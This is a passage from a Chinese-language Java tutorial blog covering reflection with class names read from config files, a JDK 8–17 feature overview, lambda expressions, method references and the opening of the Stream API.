System.out.println(column.columnType());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<h5 id="重要-反射的动态性"><a href="#重要-反射的动态性" class="headerlink" title="(重要)反射的动态性"></a>(重要)反射的动态性</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射的动态性1：动态的创建给定字符串对应的类的对象</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getInstance</span><span class="params">(String className)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) constructor.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射的动态性2：动态的创建指定字符串对应类的对象，并调用指定的方法</span></span><br><span class="line">    <span class="keyword">public</span> Object  <span class="title function_">invoke</span><span class="params">(String className,String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//动态的创建指定字符串对应类的对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(methodName);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 在实际开发中类名，方法名可能是写在配置文件或通过浏览器发送来的</span></span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;全类名&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> getInstance(className);</span><br><span class="line">        System.out.println(p1);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> (String) invoke(<span class="string">&quot;全类名&quot;</span>, <span class="string">&quot;方法名&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;返回值为：&quot;</span> + info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>反射动态性-&gt;配置文件确定执行方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1.加载配置文件，并获取指定的fruitName值</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pros</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().getResourceAsStream(<span class="string">&quot;config.properties&quot;</span>);</span><br><span class="line">        pros.load(is);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fruitStr</span> <span class="operator">=</span> pros.getProperty(<span class="string">&quot;fruitName&quot;</span>);</span><br><span class="line">        <span class="comment">//2.创建指定全类名对应类的实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(fruitStr);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> (Fruit) constructor.newInstance();</span><br><span class="line">        <span class="comment">//3. 调用相关方法，进行测试</span></span><br><span class="line">        <span class="type">Juicer</span> <span class="variable">juicer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Juicer</span>();</span><br><span class="line">        juicer.run(fruit);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">squeeze</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">squeeze</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;榨出一杯苹果汁儿&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Orange</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">squeeze</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;榨出一杯桔子汁儿&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Juicer</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(Fruit f)</span> &#123;</span><br><span class="line">		f.squeeze();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h5 id="配置文件的设置和读取简介"><a href="#配置文件的设置和读取简介" class="headerlink" title="配置文件的设置和读取简介"></a>配置文件的设置和读取简介</h5><p>配置文件应当建立在当前Module的Src目录下，以properties为文件后缀<br>示例<br>读取user.properties文件中的数据，通过反射完成User类对象的创建及对应方法的调用。</p>
<p>配置文件user.properties内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">className:com.atguigu.bean.User</span><br><span class="line">methodName:show</span><br></pre></td></tr></table></figure>

<p>User.java文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是一个脉脉平台的用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ReflectTest.java文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1.创建Properties对象</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.加载配置文件，转换为一个集合</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> classLoader.getResourceAsStream(<span class="string">&quot;user.properties&quot;</span>);</span><br><span class="line">        pro.load(is);</span><br><span class="line">        <span class="comment">//3.获取配置文件中定义的数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        <span class="comment">//4.加载该类进内存</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">        <span class="comment">//5.创建对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">        <span class="comment">//6.获取方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">showMethod</span> <span class="operator">=</span> clazz.getMethod(methodName);</span><br><span class="line">        <span class="comment">//7.执行方法</span></span><br><span class="line">        showMethod.invoke(instance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="第18章-JDK8-17新特性"><a href="#第18章-JDK8-17新特性" class="headerlink" title="第18章_JDK8-17新特性"></a>第18章_JDK8-17新特性</h3><p><a href="https://openjdk.java.net/projects/jdk9/">JDK9新特性</a><br><a href="https://openjdk.java.net/projects/jdk/10/">JDK10新特性</a><br><a href="https://openjdk.java.net/projects/jdk/17/">JDK17新特性</a><br>重要版本更新：1996 jdk1.0  2004 jdk5.0  2014 jdk8.0  2017 jdk9.0<br>长期支持版本jad8,jdk11,jdk17</p>
<ul>
<li>语法层面：<ul>
<li>比如JDK5中的自动拆箱、自动装箱、enum、泛型</li>
<li>比如JDK8中的lambda表达式、接口中的默认方法、静态方法</li>
<li>比如JDK10中局部变量的类型推断</li>
<li>比如JDK12中的switch</li>
<li>比如JDK13中的文本块</li>
</ul>
</li>
<li>API层面：<ul>
<li>比如JDK8中的Stream、Optional、新的日期时间、HashMap的底层结构</li>
<li>比如JDK9中String的底层结构</li>
<li>新的 &#x2F; 过时的 API</li>
</ul>
</li>
<li>底层优化<ul>
<li>比如JDK8中永久代被元空间替代、新的JS执行引擎</li>
<li>比如新的垃圾回收器、GC参数、JVM的优化</li>
</ul>
</li>
</ul>
<h4 id="Jdk8-Lambda表达式和方法引用"><a href="#Jdk8-Lambda表达式和方法引用" class="headerlink" title="Jdk8:Lambda表达式和方法引用"></a>Jdk8:Lambda表达式和方法引用</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727173149.png" alt="JDK8新特性"></p>
<ul>
<li>速度更快</li>
<li>代码更少(增加了新的语法：<strong>Lambda</strong> <strong>表达式</strong>)</li>
<li>强大的 <strong>Stream API</strong></li>
<li>便于并行<ul>
<li><strong>并行流</strong>就是把一个内容分成多个数据块，并用不同的线程分别处理每个数据块的流。相比较串行的流，并行的流可以很大程度上提高程序的执行效率。</li>
<li>Java 8 中将并行进行了优化，我们可以很容易的对数据进行并行操作。Stream API 可以声明性地通过 parallel() 与 sequential() 在并行流与顺序流之间进行切换。</li>
</ul>
</li>
<li>最大化减少空指针异常：Optional</li>
<li>Nashorn引擎，允许在JVM上运行JS应用<ul>
<li>发音“nass-horn”，是德国二战时一个坦克的命名</li>
<li>javascript运行在jvm已经不是新鲜事了，Rhino早在jdk6的时候已经存在。现在替代Rhino，官方的解释是Rhino相比其他JavaScript引擎（比如google的V8）实在太慢了，改造Rhino还不如重写。所以Nashorn的性能也是其一个亮点。</li>
<li>Nashorn 项目在 JDK 9 中得到改进；在JDK11 中<code>Deprecated</code>，后续JDK15版本中<code>remove</code>。在JDK11中取以代之的是GraalVM。（GraalVM是一个运行时平台，它支持Java和其他基于Java字节码的语言，但也支持其他语言，如JavaScript，Ruby，Python或LLVM。性能是Nashorn的2倍以上。）</li>
</ul>
</li>
</ul>
<h5 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h5><p>Lambda表达式作为接口的实现类的对象，是一个匿名函数</p>
<p><strong>函数式接口</strong></p>
<ul>
<li>当接口中只声明了一个抽象方法(待重写的方法)，那么此接口就称为函数接口，可以使用<code>注解FunctionInterface</code>标注，有多个抽象方法的接口不得使用此注解！</li>
<li>只有给函数式接口提供实现类的对象时，才可以使用lambda表达式</li>
<li>api中的函数式接口都声明在<code>java.util.function</code>包下（jdk8中）<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727184143.png" alt="四大函数式接口"></li>
</ul>
<p><strong>Lambda表达式格式说明</strong></p>
<ol>
<li><code>-&gt;</code>是lambda操作符或箭头操作符</li>
<li><code>-&gt;</code>符号左侧为lambda形参列表，对应着要重写的接口中的抽象方法的形参列表</li>
<li><code>-&gt;</code>符号右侧为lambda体，对应着接口的实现类要重写的方法的方法体</li>
<li><code>lambda形参列表 -&gt; lambda体</code></li>
</ol>
<p><strong>Lambda表达式的写法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 语法格式一：无参，无返回值</span></span><br><span class="line">    <span class="type">Runnable</span> <span class="variable">r1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我爱北京天安门&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// lambda表达式</span></span><br><span class="line">    <span class="type">Runnable</span> <span class="variable">r2</span> <span class="operator">=</span> ()-&gt;&#123;System.out.println(<span class="string">&quot;我爱北京天安门&quot;</span>);&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 语法格式二：Lambda 需要一个参数，但是没有返回值。</span></span><br><span class="line">    Consumer&lt;String&gt; con = <span class="keyword">new</span> <span class="title class_">Consumer</span>&lt;String&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// Lambda表达式</span></span><br><span class="line"></span><br><span class="line">    Consumer&lt;String&gt; con1 = (String s)-&gt;&#123;System.out.println(s);&#125;;</span><br><span class="line">    <span class="comment">// 方法引用写法：Consumer&lt;String&gt; con1 = System.out::println;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//语法格式三：数据类型可以省略，因为可由编译器推断得出，称为“类型推断”</span></span><br><span class="line">    <span class="comment">// s类型可以推断出来的,因此上述写法进一步简化</span></span><br><span class="line">    Consumer&lt;String&gt; con2 = (s)-&gt;&#123;System.out.println(s);&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//语法格式四：Lambda 若只需要一个参数时，参数的小括号可以省略</span></span><br><span class="line">    Consumer&lt;String&gt; con3 = s-&gt;&#123;System.out.println(s);&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//语法格式五：Lambda 需要两个或以上的参数，多条执行语句，并且可以有返回值</span></span><br><span class="line">    Comparator&lt;Integer&gt; com1 = <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line">            System.out.println(o1);</span><br><span class="line">            System.out.println(o2);</span><br><span class="line">            <span class="keyword">return</span> o1.compareTo(o2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Comparator&lt;Integer&gt; com2 = (o1, o2) -&gt; &#123;</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">        System.out.println(o2);</span><br><span class="line">        <span class="keyword">return</span> o1.compareTo(o2);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//语法格式六：当 Lambda 体只有一条语句时，return 与大括号若有，可以一并省略</span></span><br><span class="line">    Comparator&lt;Integer&gt; com3 = (o1,o2) -&gt; o1.compareTo(o2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>其他常用函数式接口</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727185259.png" alt="消费型接口"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727185358.png" alt="供给型接口"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727185434.png" alt="函数型接口1"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727185543.png" alt="函数型接口2"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727185608.png" alt="判断型接口"></p>
<p><strong>Lambda表达式语法总结</strong></p>
<ol>
<li>lambda形参列表：参数类型都可以省略，如果形参只有一个，则<code>()</code>也可以省略</li>
<li>lambda体：如果方法体只有一行执行语句，则一对<code>&#123;&#125;</code>可以省略；省略<code>&#123;&#125;</code>时若有return关键字，则必须一并省略</li>
</ol>
<h5 id="方法引用、构造器引用、数组引用"><a href="#方法引用、构造器引用、数组引用" class="headerlink" title="方法引用、构造器引用、数组引用"></a>方法引用、构造器引用、数组引用</h5><p>Lambda表达式是可以简化函数式接口的变量或形参赋值的语法。<br>方法引用和构造器引用是为了简化Lambda表达式的。</p>
<p>方法引用作为了函数式接口的实例</p>
<p><strong>方法引用的格式：类(对象) :: 类名</strong></p>
<p><strong>情况一：对象 :: 实例方法</strong><br>函数式接口中的抽象方法a与其内部实现时调用的对象的某个方法b的形参列表和返回值类型都相同或一致(满足多态或自动装箱)时,可以考虑使用方法b实现对方法a的替换、覆盖，此替换或覆盖即为方法引用</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Consumer中的void accept(T t)</span></span><br><span class="line"><span class="comment">//PrintStream中的void println(T t)</span></span><br><span class="line">Consumer&lt;String&gt; con = <span class="keyword">new</span> <span class="title class_">Consumer</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// Lambda表达式</span></span><br><span class="line">Consumer&lt;String&gt; con1 = (String s)-&gt;&#123;System.out.println(s);&#125;;</span><br><span class="line"><span class="comment">// 方法引用</span></span><br><span class="line">Consumer&lt;String&gt; con2 = System.out::println;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Supplier中的T get()</span></span><br><span class="line"><span class="comment">//Employee中的String getName()</span></span><br><span class="line"><span class="type">Employee</span> <span class="variable">emp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;tom&quot;</span>,<span class="number">10</span>);</span><br><span class="line">Supplier&lt;String&gt; sup = <span class="keyword">new</span> <span class="title class_">Supplier</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> emp.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// lambda</span></span><br><span class="line">Supplier&lt;String&gt; sup1 = ()-&gt;emp.getName();</span><br><span class="line"><span class="comment">// 方法引用 对象emp :: 方法名 getName</span></span><br><span class="line">Supplier&lt;String&gt; sup2 = emp::getName;</span><br></pre></td></tr></table></figure>

<p><strong>情况二：类 :: 静态方法</strong><br>函数式接口中的抽象方法a与其内部实现时调用的类的某个静态方法b的形参列表和返回值类型都相同或一致(满足多态或自动装箱)时,可以考虑使用方法b实现对方法a的替换、覆盖，此替换或覆盖即为方法引用</p>
<p>注意：此时的方法b是静态方法，需要通过类调用<br>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Comparator中的int compare(T t1,T t2)</span></span><br><span class="line"><span class="comment">//Integer中的int compare(T t1,T t2)</span></span><br><span class="line">Comparator&lt;Integer&gt; com1 = <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.compare(o1,o2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// lambda</span></span><br><span class="line">Comparator&lt;Integer&gt; com2 = (o1, o2) -&gt; Integer.compare(o1,o2);</span><br><span class="line"><span class="comment">// 方法引用</span></span><br><span class="line">Comparator&lt;Integer&gt; com3 = Integer :: compare;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function中的R apply(T t)</span></span><br><span class="line"><span class="comment">//Math中的Long round(Double d)</span></span><br><span class="line">Function&lt;Double,Long&gt; fun1 = <span class="keyword">new</span> <span class="title class_">Function</span>&lt;Double, Long&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">apply</span><span class="params">(Double aDouble)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.round(aDouble);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Function&lt;Double,Long&gt; fun2 = aDouble -&gt; Math.round(aDouble);</span><br><span class="line">Function&lt;Double,Long&gt; fun3 = Math::round;</span><br></pre></td></tr></table></figure>

<p><strong>情况三：类 :: 实例方法</strong><br>函数式接口中的抽象方法a与其内部实现时调用的类的某个方法b的返回值类型相同，同时抽象方法a中有n个参数而方法b中有除a中第一个参数外的n-1个参数时，可以考虑使用方法b实现对方法a的替换、覆盖，此替换或覆盖即为方法引用</p>
<p>注意：此方法b是非静态的方法，需要通过对象调用，但形式上写成对象a所属类调用<br>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Comparator中的int comapre(T t1,T t2)</span></span><br><span class="line"><span class="comment">// String中的int t1.compareTo(t2)</span></span><br><span class="line">Comparator&lt;Integer&gt; com1 = <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o1.compareTo(o2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Comparator&lt;Integer&gt; com2 = (o1, o2) -&gt; o1.compareTo(o2);</span><br><span class="line">Comparator&lt;Integer&gt; com3 = Integer::compareTo;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BiPredicate中的boolean test(T t1, T t2);</span></span><br><span class="line"><span class="comment">//String中的boolean t1.equals(t2)</span></span><br><span class="line">BiPredicate&lt;String,String&gt; bip1 = <span class="keyword">new</span> <span class="title class_">BiPredicate</span>&lt;String, String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">test</span><span class="params">(String s, String s2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s.equals(s2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">BiPredicate&lt;String,String&gt; bip2 = (s,s2) -&gt; s.equals(s2);</span><br><span class="line">BiPredicate&lt;String,String&gt; bip3 = String::equals;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function中的T get()</span></span><br><span class="line"><span class="comment">//Employee中的String getName()</span></span><br><span class="line"><span class="type">Employee</span> <span class="variable">emp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;tom&quot;</span>,<span class="number">10</span>);</span><br><span class="line">Function&lt;Employee,String&gt; fun1 = <span class="keyword">new</span> <span class="title class_">Function</span>&lt;Employee,String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">apply</span><span class="params">(Employee emp)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> emp.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// lambda</span></span><br><span class="line">Function&lt;Employee,String&gt; fun2 = emp -&gt;emp.getName();</span><br><span class="line"><span class="comment">// 方法引用 类名 :: 方法名 getName</span></span><br><span class="line">Function&lt;Employee,String&gt; fun3 = Employee::getName;</span><br></pre></td></tr></table></figure>


<p><strong>构造器引用和数组引用</strong></p>
<p>格式：<code>类名::new</code><br>调用了类名对应类中的某一个确定的构造器，具体取决于函数式接口的抽象方法的形参列表（顺序个数类型）<br>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Supplier中的T get()</span></span><br><span class="line">Supplier&lt;Employee&gt; sup = <span class="keyword">new</span> <span class="title class_">Supplier</span>&lt;Employee&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Employee <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用的是空参构造器</span></span><br><span class="line">Supplier&lt;Employee&gt; sup1 = Employee::<span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function中的R apply(T t)</span></span><br><span class="line">Function&lt;Integer, Employee&gt; fun1 = <span class="keyword">new</span> <span class="title class_">Function</span>&lt;Integer, Employee&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Employee <span class="title function_">apply</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用的是构造器Employee(id)</span></span><br><span class="line">Function&lt;Integer, Employee&gt; fun2 = Employee::<span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BiFunction中的R apply(T t,U u)</span></span><br><span class="line">BiFunction&lt;String, Integer, Employee&gt; bif = <span class="keyword">new</span> <span class="title class_">BiFunction</span>&lt;String, Integer, Employee&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Employee <span class="title function_">apply</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用的是构造器Employee(name,age)</span></span><br><span class="line">BiFunction&lt;String, Integer, Employee&gt; bif2 = Employee::<span class="keyword">new</span>;</span><br></pre></td></tr></table></figure>


<p><strong>数组引用</strong><br>格式：<code>数组名[]::new</code></p>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Function中的R apply(T t)</span></span><br><span class="line">Function&lt;Integer, Employee[]&gt; fun1 = <span class="keyword">new</span> <span class="title class_">Function</span>&lt;Integer, Employee[]&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Employee[] apply(Integer length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Employee</span>[length];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Function&lt;Integer, Employee[]&gt; fun2 = Employee[]::<span class="keyword">new</span>;</span><br></pre></td></tr></table></figure>


<h4 id="jdk8-Stream-API-用于集合操作"><a href="#jdk8-Stream-API-用于集合操作" class="headerlink" title="jdk8: Stream API(用于集合操作)"></a>jdk8: Stream API(用于集合操作)</h4><p>关注多个数据的计算（排序、查找、过滤、映射、遍历等），面向CPU，用于集合操作</p>
<p><strong>Stream的执行流程</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240728172455.png" alt="Stream的执行流程"></p>
<ol>
<li>创建 Stream<br>一个数据源（如：集合、数组），获取一个流</li>
<li>中间操作<br>每次处理都会返回一个持有结果的新Stream，即中间操作的方法返回值仍然是Stream类型的对象。因此中间操作可以是个<code>操作链</code>，可对数据源的数据进行n次处理，但是在终结操作前，并不会真正执行。</li>
